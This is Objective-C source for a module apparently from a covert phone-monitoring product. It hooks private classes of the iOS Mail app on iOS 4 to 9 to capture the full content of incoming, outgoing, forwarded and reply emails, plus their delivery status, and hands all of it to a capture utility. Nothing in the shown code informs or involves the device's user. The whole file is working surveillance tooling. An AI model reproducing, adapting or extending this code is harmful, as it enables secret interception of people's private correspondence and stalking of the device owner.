
/**
 - Project name :  MSFSP
 - Class name   :  Mail
 - Version      :  1.0  
 - Purpose      :  For HOOKING MAIL
 - Copy right   :  18/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */


#import "MSFSP.h"
#import "MailUtils.h"
#import "Message.h"
#import "MessageBody.h"
#import "MailType.h"
#import "MFOutgoingMessageDelivery.h"
#import "MFOutgoingMessageDelivery+IOS6.h"
#import "OutgoingMessageDelivery.h"

#import "MFMailMessageLibrary.h"
#import "MFMessage.h"

#pragma mark -
#pragma mark Common incoming HOOK Method for IOS4, IOS5, IOS6, iOS 7, iOS 8, iOS9
#pragma mark -

/**
 - Method name: dataForMimePart:inRange:isComplete:downloadIfNecessary:didDownload
 - Purpose:  This method is used to hook the incomming mail for iOS 6
 - Argument list and description: No Argument.
 - Return type and description: (id) mime data
 */

HOOK(Message, dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$, id, id arg1, NSRange arg2, BOOL *arg3, BOOL arg4, BOOL *arg5) {
    DLog(@"Message --> dataForMimePart$inRange...");
    /*
	DLog(@"----------------------- arguments1 -------------------");
	DLog(@"[arg1 class] = %@", [arg1 class]);
	DLog(@"arg1 = %@", arg1);
	DLog(@"arg2.location = %lu, length = %lu", (unsigned long)arg2.location, (unsigned long)arg2.length);
	DLog(@"arg3 = %p", arg3);
	if (arg3) {
		DLog (@"arg3 = %d", *arg3);
	}
	DLog(@"arg4 = %d", arg4);
	DLog(@"arg5 = %p", arg5);
	if (arg5) {
		DLog (@"arg5 = %d", *arg5);
	}
	DLog(@"----------------------- arguments1 -------------------");
	*/
	id mimePartData = CALL_ORIG(Message, dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$, arg1, arg2, arg3, arg4, arg5);
	/*
	DLog(@"----------------------- arguments2 -------------------");
	DLog(@"[mimePartData class] = %@", [mimePartData class]); // MFData
	DLog(@"mimePartData = %@", mimePartData);
	DLog(@"[arg1 class] = %@", [arg1 class]);
	DLog(@"arg1 = %@", arg1);
	DLog(@"arg2.location = %lu, length = %lu", (unsigned long)arg2.location, (unsigned long)arg2.length);
	DLog(@"arg3 = %p", arg3);
	DLog(@"arg4 = %d", arg4);
	DLog(@"arg5 = %p", arg5);
	DLog(@"----------------------- arguments2 -------------------");
	*/
	// Note: When capture incoming mail that is not complete would cause error in extracting data from message parts
	// When user delete the email arg3 and arg5 is null...
	BOOL isComplete = NO;
	if (arg3) {
		isComplete = *arg3;
		DLog (@"isComplete = %d", isComplete);
	}
	
//	BOOL downloadIfNecessary = arg4;
	
	BOOL didDownload = NO;
	if (arg5) {
		didDownload = *arg5;
		DLog (@"didDownload = %d", didDownload);
	}
	
	if (isComplete /*&& downloadIfNecessary && didDownload*/) {
		MailUtils *mailUtils = [[MailUtils alloc] init];
		[mailUtils incomingWithMessage:self
						   andMimeBody:[self messageBody]];
		[mailUtils release];
	}
	return (mimePartData);
}


/**
 - Method name: fetchDataForMimePart$inRange$withConsumer$isComplete$downloadIfNecessary$
 - Purpose:		This method is used to hook the incomming mail for iOS 7.1.1, 8.1, 9.0.2
 - Argument list and description: No Argument.
 - Return type and description: (id) mime data
 */

HOOK(MFMessage, fetchDataForMimePart$inRange$withConsumer$isComplete$downloadIfNecessary$, BOOL, id arg1, NSRange arg2, id arg3, BOOL* arg4, BOOL arg5) {
    DLog (@"MFMessage --> fetchDataForMimePart$inRange...");
    BOOL retVal = CALL_ORIG(MFMessage, fetchDataForMimePart$inRange$withConsumer$isComplete$downloadIfNecessary$, arg1, arg2, arg3, arg4, arg5);
    
	//DLog(@"arg1 = %@ %@", [arg1 class], arg1);
	//DLog(@"arg3 = %@ %@", [arg3 class], arg3);
    
    BOOL isComplete = NO;
	if (arg4) {
		isComplete = *arg4;
		DLog (@"isComplete = %d", isComplete);
	}
	
	if (isComplete) {
        DLog (@"... Capture Incoming Email")
        //DLog(@"-- pass argument self %@", self)
        //DLog(@"-- pass argument [self messageBody] %@", [self messageBody])
        
		MailUtils *mailUtils = [[MailUtils alloc] init];
		[mailUtils incomingWithMessage:self
						   andMimeBody:[self messageBody]];
		[mailUtils release];
	}
    return retVal;
}

/**
 - Method name: dataForMimePart:inRange:isComplete:downloadIfNecessary:didDownload
 - Purpose:		This method is used to hook the incomming mail for iOS 7
 - Argument list and description: No Argument.
 - Return type and description: (id) mime data
 */

HOOK(MFMessage, dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$, id, id arg1, _NSRange arg2, BOOL *arg3, BOOL arg4, BOOL *arg5) {
	DLog (@"================================================");
	DLog (@"MFMessage --> dataForMimePart$inRange...");
	DLog (@"================================================");
	/*
	DLog(@"----------------------- arguments1 -------------------");
	DLog(@"[arg1 class] = %@", [arg1 class]);
	DLog(@"arg1 = %@", arg1);
	DLog(@"arg2.location = %d, length = %d", arg2.location, arg2.length);	
	DLog(@"arg3 = %p", arg3);
	if (arg3) {
		DLog (@"arg3 = %d", *arg3);
	}
	DLog(@"arg4 = %d", arg4);
	DLog(@"arg5 = %p", arg5);
	if (arg5) {
		DLog (@"arg5 = %d", *arg5);
	}
	DLog(@"----------------------- arguments1 -------------------");
	*/
	id mimePartData = CALL_ORIG(MFMessage, dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$, arg1, arg2, arg3, arg4, arg5);
	/*
	DLog(@"----------------------- arguments2 -------------------");
    DLog(@"[mimePartData class] = %@", [mimePartData class]); // MFData
    DLog(@"mimePartData = %@", mimePartData);
	DLog(@"[arg1 class] = %@", [arg1 class]);
	DLog(@"arg1 = %@", arg1);
	DLog(@"arg2.location = %d, length = %d", arg2.location, arg2.length);
	DLog(@"arg3 = %p", arg3);
	DLog(@"arg4 = %d", arg4);
	DLog(@"arg5 = %p", arg5);
	DLog(@"----------------------- arguments2 -------------------");
	*/
	// Note: When capture incoming mail that is not complete would cause error in extracting data from message parts
	// When user delete the email arg3 and arg5 is null...
	BOOL isComplete = NO;
	if (arg3) {
		isComplete = *arg3;
		DLog (@"isComplete = %d", isComplete);
	}
	
//	BOOL downloadIfNecessary = arg4;
	
	BOOL didDownload = NO;
	if (arg5) {
		didDownload = *arg5;
		DLog (@"didDownload = %d", didDownload);
	}
	
	if (isComplete /*&& downloadIfNecessary && didDownload*/) {
		MailUtils *mailUtils = [[MailUtils alloc] init];
		[mailUtils incomingWithMessage:self
						   andMimeBody:[self messageBody]];
		[mailUtils release];
	}
	return (mimePartData);
}

#pragma mark -
#pragma mark Outgoing HOOK Method1 for IOS5 ad IOS6,7,8,9 (from out side Mail app, like share note via Mail)


/**
 - Method name: initWithMessage
 - Purpose:		This method is used to hook the outgoing mail in IOS5
				For iOS 7, the below content will be called
				- photo with text
				- voice memo file with text
 - Argument list and description: arg1(id).
 - Return type and description: MFOutgoingMessageDelivery (id)
 */

HOOK (MFOutgoingMessageDelivery,initWithMessage$,id,id arg1) {
	DLog (@"================================================");
	DLog (@"MFOutgoingMessageDelivery --> initWithMessage$");
	DLog (@"================================================");
	id omd = CALL_ORIG(MFOutgoingMessageDelivery,initWithMessage$,arg1);
	/*
    DLog(@"arg: %@", omd);
    DLog(@"class: %@", [omd class]);
    DLog(@"arg1: %@", arg1);
    DLog(@"class: %@", [arg1 class]);		// LibraryMessage for photo only
	*/
	MailUtils *mailUtils=[[MailUtils alloc]init];
	[mailUtils outgoingMessageWithOutgoingMessageDelivery:self
											  andContents:omd];
	
	[mailUtils release];
	return omd;
}


#pragma mark Outgoing HOOK Method2 for IOS5, IOS6,iOS8,iOS9 (new email)


/**
 - Method name: initWithHeaders:mixedContent:textPartsAreHTML
 - Purpose:		This method is used to hook the outgoing mail for IOS5
				For iOS 7, the below content will be called
				- text
				- reply text
 - Argument list and description: arg1(id),arg2(id),arg3(id)
 - Return type and description: MFOutgoingMessageDelivery (id)
 */

HOOK(MFOutgoingMessageDelivery,initWithHeaders$mixedContent$textPartsAreHTML$,id,id arg1,id arg2,id arg3) {
	DLog (@"================================================");
    DLog (@"Capturing:	MFOutgoingMessageDelivery --> MIX");
	DLog (@"================================================");
	id omd = CALL_ORIG(MFOutgoingMessageDelivery,initWithHeaders$mixedContent$textPartsAreHTML$,arg1,arg2,arg3);
	/*
    DLog(@"arg: %@", omd);
    DLog(@"class: %@", [omd class]);
    DLog(@"arg1: %@", arg1);
    DLog(@"class: %@", [arg1 class]);		// MutableMessageHeaders for text
    DLog(@"arg2: %@", arg2);
    DLog(@"class: %@", [arg2 class]);		// __NSArrayM for text
    DLog(@"arg3: %@", arg3);
    DLog(@"class: %@", [arg3 class]);		// nulll for text
    */
    MailUtils *mailUtils=[[MailUtils alloc]init];
	[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd
											  andContents:arg2];
	[mailUtils release];
	return omd;
}

#pragma mark Outgoing HOOK Method3 for IOS5


/**
 - Method name: initWithHeaders:HTML:plainTextAlternative:other
 - Purpose:  This method is used to hook the outgoing mail for IOS5
 - Argument list and description: arg1(id),arg2(id),arg3(id),arg4(id).
 - Return type and description: MFOutgoingMessageDelivery (id)
 */

HOOK(MFOutgoingMessageDelivery,initWithHeaders$HTML$plainTextAlternative$other$,id,id arg1,id arg2,id arg3,id arg4) {
	DLog (@"================================================");
    DLog (@"MFOutgoingMessageDelivery --> HTML");
	DLog (@"================================================");
	id omd = CALL_ORIG(MFOutgoingMessageDelivery,initWithHeaders$HTML$plainTextAlternative$other$,arg1,arg2,arg3,arg4);
	/*
    DLog(@"arg: %@", omd);
    DLog(@"class: %@", [omd class]);
    DLog(@"arg1: %@", arg1);
    DLog(@"class: %@", [arg1 class]);
    DLog(@"arg2: %@", arg2);
    DLog(@"class: %@", [arg2 class]);		// __NSCFString for forward text
    DLog(@"arg3: %@", arg3);
    DLog(@"class: %@", [arg3 class]);		// PlainTextDocument for forward text
    DLog(@"arg4: %@", arg4);
    DLog(@"class: %@", [arg4 class]);		// __NSArrayI for forward text
	*/
	MailUtils *mailUtils = [[MailUtils alloc] init];
	if (arg2) {
		[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd andContents:arg2];
	} else if (arg4) {
		[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd andContentArray:arg4];
	}
    [mailUtils release];
	
	return omd;
}

#pragma mark Outgoing HOOK Method4 for IOS5, IOS6,iOS7,8,9


/**
 - Method name: deliverSynchronously
 - Purpose:  This method is used to hook the outgoing mail for IOS5
 - Argument list and description:No Argument
 - Return type and description: MFOutgoingMessageDelivery (id)
 */

HOOK (MFOutgoingMessageDelivery,deliverSynchronously,id) {
	DLog (@"================================================");
	DLog (@"MFOutgoingMessageDelivery --> deliverSynchronously");
	DLog (@"================================================");
	id status =CALL_ORIG(MFOutgoingMessageDelivery,deliverSynchronously);
	
	if ([[[UIDevice currentDevice] systemVersion] floatValue] >= 7.0) {		
		DLog(@"deliverSynchronously status: [%@] %@", [status class], status);	//MFDeliveryResult
		id mfDeliveryResult     = status;
		int deliveryStatus		= [mfDeliveryResult status];
		DLog(@"deliverSynchronously status: %d ", deliveryStatus) ;
		double timeStamps		=[[self message] dateSentAsTimeIntervalSince1970];
		MailUtils *mailUtils	=[[MailUtils alloc]init];
		
        if (deliveryStatus == 0) {
			[mailUtils deliveredOutgoingMail:timeStamps];
        } else {				 // 1, 7 unsuccessful
			[mailUtils removeUnsentMail:timeStamps];
        }
		[mailUtils release];
	} else {
		int deliveryStatus= (int)(long)status;
        DLog(@"deliverSynchronously status: %d", deliveryStatus);
		double timeStamps=[[self message] dateSentAsTimeIntervalSince1970];
		MailUtils *mailUtils=[[MailUtils alloc]init];
        if(deliveryStatus==_MAIL_DELIVERY_STATUS_SUCCESS_) {
			[mailUtils deliveredOutgoingMail:timeStamps];
        } else {
			[mailUtils removeUnsentMail:timeStamps];
        }
		[mailUtils release];
	}
	return status;
}

#pragma mark -
#pragma mark Fowarding, reply mail for IOS6 and IOS7,iOS8,iOS9

HOOK(MFOutgoingMessageDelivery, initWithHeaders$HTML$plainTextAlternative$other$charsets$, id, id arg1, id arg2, id arg3, id arg4, id arg5) {
	DLog (@"========================================================");
	DLog (@"MFOutgoingMessageDelivery --> initWithHeaders HTML ...");
	DLog (@"========================================================");
	id omd = CALL_ORIG(MFOutgoingMessageDelivery, initWithHeaders$HTML$plainTextAlternative$other$charsets$, arg1, arg2, arg3, arg4, arg5);
	/*
	DLog(@"----------------------- arguments -------------------");
	DLog(@"[omd class] = %@", [omd class]);
	DLog(@"omd = %@", omd);
	DLog(@"[arg1 class] = %@", [arg1 class]); // MutableMessageHeaders
	DLog(@"arg1 = %@", arg1);
	DLog(@"[arg2 class] = %@", [arg2 class]); // __NSCFString
	DLog(@"arg2 = %@", arg2);
	
	DLog(@"[arg3 class] = %@", [arg3 class]); // PlainTextDocument
	DLog(@"arg3 = %@", arg3);
	
	DLog(@"[arg4 class] = %@", [arg4 class]); // __NSArrayI
	DLog(@"arg4 = %@", arg4);
	DLog(@"[arg5 class] = %@", [arg5 class]); // __NSArrayM of MFMimeCharset
	DLog(@"arg5 = %@", arg5);
	DLog(@"----------------------- arguments -------------------");
	*/
	MailUtils *mailUtils = [[MailUtils alloc] init];
	if (arg2) {
		[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd andContents:arg2];
	} else if (arg4) {
		[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd andContentArray:arg4];
	}
    [mailUtils release];
	
	return omd;
}

#pragma mark -
#pragma mark Outgoing HOOK Method1 for IOS4


/**
 - Method name: initWithMessage
 - Purpose:  This method is used to hook the outgoing mail in IOS4
 - Argument list and description: arg1(id).
 - Return type and description: OutgoingMessageDelivery (id)
 */

// Tested in IOS 4, it was NOT called for outgoing mail
HOOK (OutgoingMessageDelivery,initWithMessage$,id,id arg1) {
	DLog (@"OutgoingMessageDelivery --> initWithMessage")
	id omd = CALL_ORIG(OutgoingMessageDelivery,initWithMessage$,arg1);
	/*
	DLog(@"omd: %@", omd);
	DLog(@"class: %@", [omd class]);
	DLog(@"arg1: %@", arg1);
	DLog(@"class: %@", [arg1 class]);
	*/
	MailUtils *mailUtils = [[MailUtils alloc]init];
	[mailUtils outgoingMessageWithOutgoingMessageDelivery:self
											  andContents:omd];
	[mailUtils release];
    
	return omd;
}

#pragma mark Outgoing HOOK Method2 for IOS4 


/**
 - Method name: initWithHeaders:mixedContent:textPartsAreHTML
 - Purpose:  This method is used to hook the outgoing mail for IOS4
 - Argument list and description: arg1(id),arg2(id),arg3(id)
 - Return type and description: OutgoingMessageDelivery (id)
 */

// Tested in IOS 4, hooked for outgoing mail
HOOK(OutgoingMessageDelivery,initWithHeaders$mixedContent$textPartsAreHTML$,id,id arg1,id arg2,id arg3) {
	DLog(@"OutgoingMessageDelivery --> initWithHeaders$mixedContent$textPartsAreHTML")
	id omd = CALL_ORIG(OutgoingMessageDelivery,initWithHeaders$mixedContent$textPartsAreHTML$,arg1,arg2,arg3);
	/*
    DLog(@"arg: %@", omd);
    DLog(@"class: %@", [omd class]);
    DLog(@"arg1: %@", arg1);
    DLog(@"class: %@", [arg1 class]);		// MutableMessageHeaders for text
    DLog(@"arg2: %@", arg2);
    DLog(@"class: %@", [arg2 class]);		// __NSArrayM for text
    DLog(@"arg3: %@", arg3);
    DLog(@"class: %@", [arg3 class]);		// nulll for text
    */
	MailUtils *mailUtils=[[MailUtils alloc]init];
	[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd
											  andContents:arg2];
    [mailUtils release];
    
	return omd;
}

#pragma mark Outgoing HOOK Method3 for IOS4 


/**
 - Method name: initWithHeaders:HTML:plainTextAlternative:other
 - Purpose:  This method is used to hook the outgoing mail for IOS4
 - Argument list and description: arg1(id),arg2(id),arg3(id),arg4(id).
 - Return type and description: OutgoingMessageDelivery (id)
 */

HOOK(OutgoingMessageDelivery,initWithHeaders$HTML$plainTextAlternative$other$,id,id arg1,id arg2,id arg3,id arg4) {
	DLog(@"OutgoingMessageDelivery --> initWithHeaders$HTML$plainTextAlternative$other$")
	id omd =CALL_ORIG(OutgoingMessageDelivery,initWithHeaders$HTML$plainTextAlternative$other$,arg1,arg2,arg3,arg4);
	/*
    DLog(@"arg: %@", omd);
    DLog(@"class: %@", [omd class]);
    DLog(@"arg1: %@", arg1);
    DLog(@"class: %@", [arg1 class]);
    DLog(@"arg2: %@", arg2);
    DLog(@"class: %@", [arg2 class]);		// __NSCFString for forward text
    DLog(@"arg3: %@", arg3);
    DLog(@"class: %@", [arg3 class]);		// PlainTextDocument for forward text
    DLog(@"arg4: %@", arg4);
    DLog(@"class: %@", [arg4 class]);		// __NSArrayI for forward text
	*/
	MailUtils *mailUtils=[[MailUtils alloc] init];
	if (arg2) {
		[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd  andContents:arg2];
	} else if (arg4) {
		[mailUtils outgoingMessageWithOutgoingMessageDelivery:omd andContentArray:arg4];
	}
    [mailUtils release];
    
	return omd;
}

#pragma mark Outgoing HOOK Method4 for IOS4 

/**
 - Method name: deliverSynchronously
 - Purpose:  This method is used to hook the outgoing mail for IOS4
 - Argument list and description:No Argument
 - Return type and description: OutgoingMessageDelivery (id)
 */

// Tested in iOS4, called for outgoing mail
HOOK (OutgoingMessageDelivery, deliverSynchronously, id) {
	DLog(@"OutgoingMessageDelivery --> deliverSynchronously")
	id status = CALL_ORIG(OutgoingMessageDelivery,deliverSynchronously);
	
	int deliveryStatus = (int)(long)status;
    DLog(@"DeliveryStatus %d", deliveryStatus);
	double timeStamps= [[self message] dateSentAsTimeIntervalSince1970];
	MailUtils *mailUtils=[[MailUtils alloc]init];
    if(deliveryStatus ==_MAIL_DELIVERY_STATUS_SUCCESS_) {
	    [mailUtils deliveredOutgoingMail:timeStamps];
    } else {
		[mailUtils removeUnsentMail:timeStamps];
    }
	[mailUtils release];
    
    return status;
}


